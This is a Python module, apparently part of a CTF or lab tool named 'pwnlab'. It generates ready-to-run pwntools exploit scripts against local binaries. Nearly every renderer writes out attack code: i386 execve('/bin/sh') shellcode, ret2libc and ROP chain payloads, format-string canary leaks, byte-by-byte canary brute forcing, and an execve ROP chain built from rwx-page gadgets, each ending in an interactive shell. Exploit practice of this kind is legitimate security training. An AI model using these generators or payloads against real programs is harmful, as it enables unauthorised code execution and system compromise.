"""Render ready-to-run pwntools exploit scripts from a Strategy."""
from __future__ import annotations

from pathlib import Path

from .config import Config
from .strategy import Strategy


# ---------------------------------------------------------------------------
# Shared helpers rendered into every script
# ---------------------------------------------------------------------------

def _process_call(s: Strategy, cfg: Config) -> str:
    wrapper = cfg.wrapper_parts()
    env_dict = repr(dict(cfg.env))
    if s.input_mode in ("file-raw", "file-size-data"):
        base_cmd = repr(wrapper + [str(s.binary)])
        return f"p = process({base_cmd} + [INPUT_FILE], env={env_dict}, stdin=PTY)\n"
    else:
        cmd = repr(wrapper + [str(s.binary)])
        return f"p = process({cmd}, env={env_dict}, stdin=PTY)\n"


def _input_file_decl(s: Strategy) -> str:
    if s.input_mode in ("file-raw", "file-size-data"):
        return f"INPUT_FILE = \"/tmp/pwnlab_{s.binary.name}\"\n\n"
    return ""


def _write_payload(s: Strategy) -> str:
    if s.input_mode == "file-size-data":
        return (
            "with open(INPUT_FILE, 'wb') as f:\n"
            "    f.write(str(len(payload)).encode() + b' ' + payload + b'\\n')\n"
        )
    if s.input_mode == "file-raw":
        return (
            "with open(INPUT_FILE, 'wb') as f:\n"
            "    f.write(payload)\n"
        )
    return ""


def _send_payload(s: Strategy) -> str:
    if s.input_mode == "stdin":
        return "p.sendline(payload)\n"
    return ""


def _header(strategy_name: str, binary: Path, notes: list[str], todos: list[str]) -> str:
    note_lines = "\n".join(f"#   {n}" for n in notes) if notes else "#   (none)"
    todo_lines = "\n".join(f"#   TODO: {t}" for t in todos) if todos else "#   (none)"
    return (
        f"#!/usr/bin/env python3\n"
        f'"""\n'
        f"Strategy : {strategy_name}\n"
        f"Binary   : {binary.name}\n"
        f"Notes    :\n{note_lines}\n"
        f"TODOs    :\n{todo_lines}\n"
        f'"""\n'
        f"from pwn import *\n\n"
        f"context.log_level = \"info\"\n\n"
        f"def _interact(io) -> None:\n"
        f"    try:\n"
        f"        io.interactive()\n"
        f"    except (EOFError, KeyboardInterrupt):\n"
        f"        pass\n"
    )


# ---------------------------------------------------------------------------
# Strategy renderers
# ---------------------------------------------------------------------------

def _shellcode(s: Strategy, cfg: Config) -> str:
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    offset = s.offset if s.offset is not None else "0  # TODO: determine offset"
    write = _write_payload(s)
    send = _send_payload(s)

    # Use PTY so /bin/sh stays interactive after execve
    wrapper = cfg.wrapper_parts()
    env_dict = repr(dict(cfg.env))
    if s.input_mode in ("file-raw", "file-size-data"):
        base_cmd = repr(wrapper + [str(s.binary)])
        proc = f"p = process({base_cmd} + [INPUT_FILE], env={env_dict}, stdin=PTY)\n"
    else:
        cmd = repr(wrapper + [str(s.binary)])
        proc = f"p = process({cmd}, env={env_dict}, stdin=PTY)\n"

    esp_val = s.addresses.get("esp_at_overflow")
    post_eip = any("post-EIP" in n for n in s.notes)

    if cfg.target.arch == "i386":
        shellcode_block = (
            "shellcode = asm('''\n"
            "    xor eax, eax\n"
            "    push eax\n"
            "    push 0x68732f2f\n"
            "    push 0x6e69622f\n"
            "    mov ebx, esp\n"
            "    push eax\n"
            "    push ebx\n"
            "    mov ecx, esp\n"
            "    cdq\n"
            "    mov al, 0xb\n"
            "    int 0x80\n"
            "''')\n"
        )
    else:
        shellcode_block = "shellcode = asm(shellcraft.sh())\n"

    if post_eip and esp_val:
        # Post-EIP layout: padding fills the buffer, then we return to ESP-after-ret
        # (measured by GDB) where a small NOP sled + shellcode land.
        # No buffer-start guessing needed — works regardless of environment.
        addr_line = f"ESP_AT_RET = {hex(esp_val)}  # ESP measured by GDB after ret"
        if cfg.target.arch == "i386":
            payload_line = "payload = b'A' * OFFSET + p32(ESP_AT_RET) + b'\\x90' * 16 + shellcode\n\n"
        else:
            payload_line = "payload = b'A' * OFFSET + p64(ESP_AT_RET) + b'\\x90' * 16 + shellcode\n\n"
    else:
        # Legacy layout: shellcode at offset 0, return address points to buffer start.
        addr_line = (
            f"BUF_START = {hex(esp_val)}"
            if esp_val
            else "BUF_START = 0xDEADBEEF  # TODO: replace with actual buffer address (run 'pwnlab auto')"
        )
        if cfg.target.arch == "i386":
            shellcode_block += "filler = asm('nop') * (OFFSET - len(shellcode))\n"
            payload_line = "payload = shellcode + filler + p32(BUF_START)\n\n"
        else:
            payload_line = "payload = shellcode + b'\\x90' * (OFFSET - len(shellcode)) + p64(BUF_START)\n\n"

    return (
        _header("shellcode", s.binary, s.notes, s.todos)
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY = \"{s.binary}\"\n"
        + f"OFFSET = {offset}\n"
        + _input_file_decl(s)
        + shellcode_block + "\n"
        + f"{addr_line}\n\n"
        + payload_line
        + write
        + proc
        + send
        + "_interact(p)\n"
    )


def _ret2libc(s: Strategy, cfg: Config) -> str:
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    ptr = "p32" if cfg.target.arch == "i386" else "p64"
    offset = s.offset if s.offset is not None else "0  # TODO"
    proc = _process_call(s, cfg)
    write = _write_payload(s)
    send = _send_payload(s)

    sys_addr = s.addresses.get("system")
    binsh_addr = s.addresses.get("binsh")
    libc_path = s.libc_path

    if sys_addr:
        system_line = f"system_addr = {hex(sys_addr)}  # from PLT/symbols"
    elif libc_path:
        system_line = (
            f"libc = ELF(\"{libc_path}\", checksec=False)\n"
            "# TODO: libc base needed — leak via GOT first, then:\n"
            "# system_addr = libc_base + libc.symbols['system']\n"
            "system_addr = 0xDEADBEEF  # TODO"
        )
    else:
        system_line = "system_addr = 0xDEADBEEF  # TODO: find system address"

    if binsh_addr:
        binsh_line = f"binsh_addr  = {hex(binsh_addr)}  # found in binary"
    elif libc_path:
        binsh_line = (
            f"# /bin/sh not in binary — search in libc (needs libc base)\n"
            f"libc = ELF(\"{libc_path}\", checksec=False)\n"
            "# binsh_addr = libc_base + next(libc.search(b'/bin/sh'))\n"
            "binsh_addr = 0xDEADBEEF  # TODO: needs libc base"
        )
    else:
        binsh_line = "binsh_addr = 0xDEADBEEF  # TODO: find /bin/sh address"

    if cfg.target.arch == "i386":
        payload_comment = (
            "# i386 stack layout after overflow:\n"
            "#   [padding][system_addr][ret_after_system][/bin/sh_ptr]\n"
        )
        payload_body = (
            "payload = flat(\n"
            "    b'A' * OFFSET,\n"
            "    p32(system_addr),\n"
            "    p32(0x41414141),  # return address after system() — doesn't matter\n"
            "    p32(binsh_addr),\n"
            ")\n"
        )
    else:
        payload_comment = (
            "# x86_64 stack layout after overflow:\n"
            "#   [padding][pop_rdi_ret][/bin/sh_ptr][system_addr]\n"
        )
        pop_rdi = s.addresses.get("gadgets", {}).get("pop_rdi_ret", 0xDEADBEEF)
        payload_body = (
            f"POP_RDI = {hex(pop_rdi)}\n\n"
            "payload = flat(\n"
            "    b'A' * OFFSET,\n"
            "    p64(POP_RDI),\n"
            "    p64(binsh_addr),\n"
            "    p64(system_addr),\n"
            ")\n"
        )

    return (
        _header("ret2libc", s.binary, s.notes, s.todos)
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY = \"{s.binary}\"\n"
        + f"OFFSET = {offset}\n"
        + _input_file_decl(s)
        + f"elf = ELF(BINARY, checksec=False)\n"
        + f"{system_line}\n"
        + f"{binsh_line}\n\n"
        + payload_comment
        + payload_body + "\n"
        + write
        + proc
        + send
        + "_interact(p)\n"
    )


def _rop_chain(s: Strategy, cfg: Config) -> str:
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    offset = s.offset if s.offset is not None else "0  # TODO"
    proc = _process_call(s, cfg)
    write = _write_payload(s)
    send = _send_payload(s)
    libc_path = s.libc_path
    libc_line = f'libc = ELF("{libc_path}", checksec=False)' if libc_path else "# libc not found"

    return (
        _header("rop_chain", s.binary, s.notes, s.todos)
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY = \"{s.binary}\"\n"
        + f"OFFSET = {offset}\n"
        + _input_file_decl(s)
        + f"elf  = ELF(BINARY, checksec=False)\n"
        + f"{libc_line}\n"
        + "rop  = ROP(elf)\n\n"
        + "# Build ROP chain — pwntools resolves gadgets automatically\n"
        + "# Option A: call system('/bin/sh') if /bin/sh is in the binary\n"
        + "try:\n"
        + "    binsh = next(elf.search(b'/bin/sh\\x00'))\n"
        + "    rop.call('system', [binsh])\n"
        + "except StopIteration:\n"
        + ("    rop.call('system', [next(libc.search(b'/bin/sh'))])  # needs libc base\n"
           if libc_path else
           "    pass  # TODO: find /bin/sh string\n")
        + "\nlog.info('ROP chain:')\nlog.info(rop.dump())\nchain = rop.chain()\n\n"
        + "payload = flat(b'A' * OFFSET, chain)\n\n"
        + write
        + proc
        + send
        + "_interact(p)\n"
    )


def _canary_fmt(s: Strategy, cfg: Config) -> str:
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    offset = s.offset if s.offset is not None else "0  # TODO"
    proc_factory = _process_call(s, cfg).replace("p = ", "return ")
    proc = _process_call(s, cfg)
    write = _write_payload(s)
    send = _send_payload(s)
    sys_addr = s.addresses.get("system")
    binsh_addr = s.addresses.get("binsh")
    system_line = f"system_addr = {hex(sys_addr)}" if sys_addr else "system_addr = 0xDEADBEEF  # TODO"
    binsh_line = f"binsh_addr  = {hex(binsh_addr)}" if binsh_addr else "binsh_addr  = 0xDEADBEEF  # TODO"

    return (
        _header("canary_fmt_leak", s.binary, s.notes, s.todos)
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY = \"{s.binary}\"\n"
        + f"OFFSET           = {offset}\n"
        + f"OFFSET_TO_CANARY = OFFSET - 12  # estimate: verify with GDB (canary at ebp-0x4)\n"
        + f"CANARY_FMT_POS   = 15           # TODO: find with probe loop below\n"
        + _input_file_decl(s)
        + f"elf = ELF(BINARY, checksec=False)\n"
        + f"{system_line}\n"
        + f"{binsh_line}\n\n"
        + "# ── Step 1: probe loop — run once to find CANARY_FMT_POS ─────────────────\n"
        + "# Canary always ends in \\x00 (low byte is null). Look for 0xXXXXXX00\n"
        + "def find_canary_pos():\n"
        + f"    env = {repr(dict(cfg.env))}\n"
        + f"    wrapper = {repr(cfg.wrapper_parts())}\n"
        + "    for i in range(1, 50):\n"
        + "        p = process(wrapper + [BINARY], env=env)\n"
        + "        try:\n"
        + "            p.sendline(f\"%{i}$p\".encode())\n"
        + "            line = p.recvline(timeout=2).strip()\n"
        + "            val = int(line, 16) if line.startswith(b'0x') else 0\n"
        + "            if val & 0xff == 0x00 and val != 0:\n"
        + "                log.success(f'Canary at pos {i}: {hex(val)}')\n"
        + "        except Exception:\n"
        + "            pass\n"
        + "        finally:\n"
        + "            p.close()\n\n"
        + "# Uncomment to probe:\n"
        + "# find_canary_pos()\n\n"
        + "# ── Step 2: leak canary ───────────────────────────────────────────────────\n"
        + "def leak_canary() -> int:\n"
        + f"    env = {repr(dict(cfg.env))}\n"
        + f"    wrapper = {repr(cfg.wrapper_parts())}\n"
        + "    p = process(wrapper + [BINARY], env=env)\n"
        + "    p.sendline(f\"%{CANARY_FMT_POS}$p\".encode())\n"
        + "    raw = p.recvline(timeout=3).strip()\n"
        + "    canary = int(raw, 16)\n"
        + "    p.close()\n"
        + "    log.success(f'Canary: {hex(canary)}')\n"
        + "    return canary\n\n"
        + "canary = leak_canary()\n\n"
        + "# ── Step 3: overflow with canary intact ──────────────────────────────────\n"
        + "# Stack layout: [buffer][canary][saved_ebx/rbx][saved_ebp][saved_eip]\n"
        + "# Adjust padding after canary to match actual frame layout\n"
        + "payload = flat(\n"
        + "    b'A' * OFFSET_TO_CANARY,\n"
        + "    p32(canary),\n"
        + "    b'B' * 8,         # saved_ebx (4) + saved_ebp (4) — verify in GDB\n"
        + "    p32(system_addr),\n"
        + "    p32(0x41414141),  # ret after system\n"
        + "    p32(binsh_addr),\n"
        + ")\n\n"
        + write
        + proc
        + send
        + "_interact(p)\n"
    )


def _canary_brute(s: Strategy, cfg: Config) -> str:
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    offset = s.offset if s.offset is not None else "0  # TODO"
    proc = _process_call(s, cfg)
    write = _write_payload(s)
    send = _send_payload(s)
    sys_addr = s.addresses.get("system")
    binsh_addr = s.addresses.get("binsh")
    system_line = f"system_addr = {hex(sys_addr)}" if sys_addr else "system_addr = 0xDEADBEEF  # TODO"
    binsh_line = f"binsh_addr  = {hex(binsh_addr)}" if binsh_addr else "binsh_addr  = 0xDEADBEEF  # TODO"

    return (
        _header("canary_brute_force", s.binary, s.notes, s.todos)
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY = \"{s.binary}\"\n"
        + f"OFFSET           = {offset}\n"
        + f"OFFSET_TO_CANARY = OFFSET - 12  # estimate; verify with GDB\n"
        + _input_file_decl(s)
        + f"elf = ELF(BINARY, checksec=False)\n"
        + f"{system_line}\n"
        + f"{binsh_line}\n\n"
        + "# ── Brute-force canary byte by byte ──────────────────────────────────────\n"
        + "# Works because the binary forks — each child has the same canary.\n"
        + "# Canary[0] is always 0x00. Brute bytes 1-3 (768 attempts max).\n"
        + "def brute_canary() -> int:\n"
        + f"    env = {repr(dict(cfg.env))}\n"
        + f"    wrapper = {repr(cfg.wrapper_parts())}\n"
        + "    canary = b'\\x00'\n"
        + "    for _ in range(3):\n"
        + "        for byte_val in range(256):\n"
        + "            test = canary + bytes([byte_val])\n"
        + "            pad_after = b'B' * (4 - len(test))\n"
        + "            probe = flat(\n"
        + "                b'A' * OFFSET_TO_CANARY,\n"
        + "                test + pad_after,\n"
        + "                b'C' * 8,\n"
        + "                p32(elf.symbols.get('main', 0x08048000)),  # loop back\n"
        + "            )\n"
        + "            p = process(wrapper + [BINARY], env=env)\n"
        + "            try:\n"
        + "                p.sendline(probe)\n"
        + "                p.recvline(timeout=1)\n"
        + "                canary += bytes([byte_val])\n"
        + "                log.info(f'  byte found: {hex(byte_val)} -> canary so far: {canary.hex()}')\n"
        + "                p.close()\n"
        + "                break\n"
        + "            except EOFError:\n"
        + "                p.close()\n"
        + "    return int.from_bytes(canary, 'little')\n\n"
        + "canary = brute_canary()\n"
        + "log.success(f'Canary: {hex(canary)}')\n\n"
        + "payload = flat(\n"
        + "    b'A' * OFFSET_TO_CANARY,\n"
        + "    p32(canary),\n"
        + "    b'B' * 8,\n"
        + "    p32(system_addr),\n"
        + "    p32(0x41414141),\n"
        + "    p32(binsh_addr),\n"
        + ")\n\n"
        + write
        + proc
        + send
        + "_interact(p)\n"
    )


def _heap_skeleton(s: Strategy, cfg: Config) -> str:
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    proc = _process_call(s, cfg)
    write = _write_payload(s)
    send = _send_payload(s)

    return (
        _header("heap_skeleton", s.binary, s.notes, s.todos)
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY = \"{s.binary}\"\n\n"
        + "elf = ELF(BINARY, checksec=False)\n\n"
        + "# ── Heap analysis checklist (do in GDB first) ────────────────────────────\n"
        + "#\n"
        + "# 1. Find the allocation:  break malloc, run, info args → get size\n"
        + "# 2. Find the free:        break free, check what pointer is freed\n"
        + "# 3. Map chunks:           GEF: heap chunks / heap bins\n"
        + "# 4. Identify primitive:   overflow into next chunk header? UAF? double-free?\n"
        + "#\n"
        + "# Common i386 glibc techniques (check glibc version: ldd ./binary):\n"
        + "#   glibc < 2.26  →  fastbin dup / unlink\n"
        + "#   glibc >= 2.26 →  tcache dup (simpler, no double-free check pre-2.34)\n"
        + "#   glibc >= 2.34 →  safe-linking (need heap leak to compute fd ^ (heap>>12))\n"
        + "#\n"
        + "# Target: arbitrary write → overwrite GOT entry or __malloc_hook\n"
        + "#\n"
        + "# TODO: fill in chunk sizes, offsets, and target address after GDB analysis\n\n"
        + "ALLOC_SIZE    = 0   # TODO: size passed to malloc\n"
        + "OVERFLOW_LEN  = 0   # TODO: bytes past chunk boundary you can write\n"
        + "TARGET_ADDR   = 0   # TODO: address to overwrite (e.g. elf.got['puts'])\n"
        + "OVERWRITE_VAL = 0   # TODO: value to write (e.g. elf.plt['system'])\n\n"
        + "# Placeholder — replace with your actual exploit primitives\n"
        + "payload = b'A' * ALLOC_SIZE  # TODO\n\n"
        + write
        + proc
        + send
        + "_interact(p)\n"
    )


def _rop_rwx_execve(s: Strategy, cfg: Config) -> str:
    """ROP execve chain using gadgets found in the binary's own rwx page."""
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    offset = s.offset if s.offset is not None else "0  # TODO"

    a = s.addresses
    G_pop2    = a.get("G_pop2",    0xDEADBEEF)
    G_pop_ebx = a.get("G_pop_ebx", a.get("G_pop2", 0xDEADBEEF))  # fallback to pop2
    G_xor_eax = a.get("G_xor_eax", 0xDEADBEEF)
    G_store   = a.get("G_store",   0xDEADBEEF)
    G_xor_ecx = a.get("G_xor_ecx", 0xDEADBEEF)
    G_xor_edx = a.get("G_xor_edx", 0xDEADBEEF)
    G_mov_al  = a.get("G_mov_al",  0xDEADBEEF)
    G_int80   = a.get("G_int80",   0xDEADBEEF)
    BINSH     = a.get("BINSH",     0xDEADBEEF)

    # Use pop_ebx if we have a dedicated one, otherwise use pop2 with dummy eax
    if "G_pop_ebx" in a:
        set_ebx = f"    p32(G_pop_ebx), p32(BINSH),\n"
    else:
        set_ebx = f"    p32(G_pop2), p32(0x00000000), p32(BINSH),\n"

    wrapper = cfg.wrapper_parts()
    env_dict = repr(dict(cfg.env))
    if s.input_mode in ("file-raw", "file-size-data"):
        base_cmd = repr(wrapper + [str(s.binary)])
        proc = f"p = process({base_cmd} + [INPUT_FILE], env={env_dict}, stdin=PTY)\n"
    else:
        cmd = repr(wrapper + [str(s.binary)])
        proc = f"p = process({cmd}, env={env_dict}, stdin=PTY)\n"

    write = _write_payload(s)
    send  = _send_payload(s)

    return (
        _header("rop-rwx-execve", s.binary, s.notes, s.todos)
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY     = \"{s.binary}\"\n"
        + f"OFFSET     = {offset}\n"
        + _input_file_decl(s)
        + "\n# Gadgets discovered in the binary's runtime-mapped rwx page\n"
        + f"G_pop2    = {hex(G_pop2):<12}  # pop eax; pop ebx; ret\n"
        + f"G_pop_ebx = {hex(G_pop_ebx):<12}  # pop ebx; ret\n"
        + f"G_xor_eax = {hex(G_xor_eax):<12}  # xor eax, eax; ret\n"
        + f"G_store   = {hex(G_store):<12}  # mov [ebx], eax; ret\n"
        + f"G_xor_ecx = {hex(G_xor_ecx):<12}  # xor ecx, ecx; ret\n"
        + f"G_xor_edx = {hex(G_xor_edx):<12}  # xor edx, edx; ret\n"
        + f"G_mov_al  = {hex(G_mov_al):<12}  # mov al, 0xb; ret\n"
        + f"G_int80   = {hex(G_int80):<12}  # int 0x80; ret\n"
        + f"BINSH     = {hex(BINSH):<12}  # writable buffer in same rwx page\n"
        + "\n"
        + "# Write '/bin//sh\\x00' into BINSH, then execve(BINSH, 0, 0)\n"
        + "chain = flat(\n"
        + "    p32(G_pop2),    p32(0x6e69622f), p32(BINSH),    p32(G_store),   # '/bin' -> [BINSH]\n"
        + "    p32(G_pop2),    p32(0x68732f2f), p32(BINSH+4),  p32(G_store),   # '//sh' -> [BINSH+4]\n"
        + "    p32(G_pop2),    p32(0x00000000), p32(BINSH+8),  p32(G_store),   # null  -> [BINSH+8]\n"
        + set_ebx
        + "    p32(G_xor_ecx),                                                  # ecx = 0\n"
        + "    p32(G_xor_edx),                                                  # edx = 0\n"
        + "    p32(G_xor_eax),                                                  # eax = 0\n"
        + "    p32(G_mov_al),                                                   # eax = 0xb\n"
        + "    p32(G_int80),                                                    # syscall\n"
        + ")\n\n"
        + "payload = b'A' * OFFSET + chain\n\n"
        + write
        + proc
        + send
        + "_interact(p)\n"
    )


def _canary_fmt_rop_rwx(s: Strategy, cfg: Config) -> str:
    """FIFO-based canary leak + ROP execve for interactive file+stdin binaries."""
    arch_map = {"i386": "i386", "x86_64": "amd64"}
    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
    offset = s.offset if s.offset is not None else 32

    a = s.addresses
    canary_pos = int(a.get("canary_pos", 18))
    G_pop2    = a.get("G_pop2",    0xDEADBEEF)
    G_xor_eax = a.get("G_xor_eax", 0xDEADBEEF)
    G_store   = a.get("G_store",   0xDEADBEEF)
    G_xor_ecx = a.get("G_xor_ecx", 0xDEADBEEF)
    G_xor_edx = a.get("G_xor_edx", 0xDEADBEEF)
    G_mov_al  = a.get("G_mov_al",  0xDEADBEEF)
    G_int80   = a.get("G_int80",   0xDEADBEEF)
    BINSH     = a.get("BINSH",     0xDEADBEEF)

    wrapper = cfg.wrapper_parts()
    env_dict = repr(dict(cfg.env))
    base_cmd = repr(wrapper + [str(s.binary)])

    canary_off_probed = a.get("canary_off")
    if canary_off_probed is not None:
        canary_fill_est = int(canary_off_probed)
    elif isinstance(offset, int):
        canary_fill_est = offset - 12
    else:
        canary_fill_est = "OFFSET - 12"

    if s.input_mode == "file-size-data":
        fifo_write = (
            "    raw = build_payload(canary)\n"
            "    os.write(fifo_fd, str(len(raw)).encode() + b' ' + raw)\n"
        )
    else:
        fifo_write = "    os.write(fifo_fd, build_payload(canary))\n"

    return (
        _header("canary-fmt-rop-rwx", s.binary, s.notes, s.todos)
        + "import os\nimport stat\n"
        + f"\ncontext.arch = \"{arch}\"\n\n"
        + f"BINARY           = \"{s.binary}\"\n"
        + f"FIFO             = \"/tmp/pwnlab_{s.binary.name}.fifo\"\n"
        + f"CANARY_FMT_POS   = {canary_pos}   # %N$08x stack position of canary\n"
        + f"OFFSET           = {offset}   # bytes from buffer start to return address\n"
        + (f"OFFSET_TO_CANARY = {canary_fill_est}   # buffer bytes before canary (auto-probed)\n"
           if canary_off_probed is not None else
           f"OFFSET_TO_CANARY = {canary_fill_est}   # buffer bytes before canary — TODO: verify in GDB\n")
        + "\n# RWX page gadgets (auto-discovered at runtime)\n"
        + f"G_pop2    = {hex(G_pop2):<12}  # pop eax; pop ebx; ret\n"
        + f"G_xor_eax = {hex(G_xor_eax):<12}  # xor eax, eax; ret\n"
        + f"G_store   = {hex(G_store):<12}  # mov [ebx], eax; ret\n"
        + f"G_xor_ecx = {hex(G_xor_ecx):<12}  # xor ecx, ecx; ret\n"
        + f"G_xor_edx = {hex(G_xor_edx):<12}  # xor edx, edx; ret\n"
        + f"G_mov_al  = {hex(G_mov_al):<12}  # mov al, 0xb; ret\n"
        + f"G_int80   = {hex(G_int80):<12}  # int 0x80; ret\n"
        + f"BINSH     = {hex(BINSH):<12}  # writable area in rwx page for /bin//sh\\0\n"
        + "\n"
        + "def ensure_fifo(path):\n"
        + "    try:\n"
        + "        if not stat.S_ISFIFO(os.stat(path).st_mode):\n"
        + "            raise RuntimeError(f'{path} is not a FIFO')\n"
        + "    except FileNotFoundError:\n"
        + "        os.mkfifo(path)\n\n"
        + "def build_rop() -> bytes:\n"
        + "    chain  = flat(p32(G_pop2), p32(0x6e69622f), p32(BINSH),   p32(G_store))\n"
        + "    chain += flat(p32(G_pop2), p32(0x68732f2f), p32(BINSH+4), p32(G_store))\n"
        + "    chain += flat(p32(G_pop2), p32(0x00000000), p32(BINSH+8), p32(G_store))\n"
        + "    chain += flat(p32(G_pop2), p32(0xdeadbeef), p32(BINSH))\n"
        + "    chain += flat(p32(G_xor_ecx), p32(G_xor_edx), p32(G_xor_eax),\n"
        + "                  p32(G_mov_al),  p32(G_int80))\n"
        + "    return chain\n\n"
        + "def build_payload(canary: int) -> bytes:\n"
        + "    regs_fill = OFFSET - OFFSET_TO_CANARY - 4\n"
        + "    return flat(b'A' * OFFSET_TO_CANARY, p32(canary), b'B' * regs_fill, build_rop())\n\n"
        + "def main():\n"
        + "    ensure_fifo(FIFO)\n"
        + "    # Open FIFO O_RDWR so the binary's fopen(FIFO, 'r') doesn't block\n"
        + "    fifo_fd = os.open(FIFO, os.O_RDWR)\n\n"
        + f"    io = process({base_cmd} + [FIFO], env={env_dict}, stdin=PTY)\n\n"
        + "    # Step 1: leak canary via format string\n"
        + f"    io.recvuntil(b'name')  # TODO: adjust to match the binary's name prompt\n"
        + f"    io.sendline(b'%{canary_pos}$08x')\n"
        + "    io.recvuntil(b'Welcome ', timeout=3)  # TODO: adjust text preceding canary output\n"
        + "    canary = int(io.recvline(timeout=3).strip().split()[-1], 16)\n"
        + "    log.success(f'Canary: {hex(canary)}')\n\n"
        + "    # Step 2: write overflow payload to FIFO before binary reads the file\n"
        + fifo_write
        + "\n    # Step 3: consume the 'press Enter' prompt, then trigger the overflow\n"
        + "    try:\n"
        + "        io.recvuntil(b'continue', timeout=3)  # TODO: adjust if prompt differs\n"
        + "        io.sendline(b'')\n"
        + "    except EOFError:\n"
        + "        pass\n\n"
        + "    _interact(io)\n"
        + "    os.close(fifo_fd)\n\n"
        + "if __name__ == '__main__':\n"
        + "    main()\n"
    )


def _unsupported(s: Strategy, cfg: Config) -> str:
    return (
        _header("unsupported", s.binary, s.notes, s.todos)
        + f"\n# No automated strategy could be selected.\n"
        + f"# Run: pwnlab {s.binary} --verbose  to see full recon output.\n"
        + f"# Then re-run with: --strategy <name>  to force a specific strategy.\n"
        + "# Available: shellcode, ret2libc, rop, canary-fmt, canary-brute, heap\n"
    )


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

_RENDERERS = {
    "shellcode":           _shellcode,
    "ret2libc":            _ret2libc,
    "rop":                 _rop_chain,
    "rop-rwx":             _rop_rwx_execve,
    "canary-fmt":          _canary_fmt,
    "canary-fmt-rop-rwx":  _canary_fmt_rop_rwx,
    "canary-brute":        _canary_brute,
    "heap":                _heap_skeleton,
    "unsupported":         _unsupported,
}


def render(s: Strategy, cfg: Config, out_path: Path) -> None:
    renderer = _RENDERERS.get(s.name, _unsupported)
    script = renderer(s, cfg)
    out_path.write_text(script)
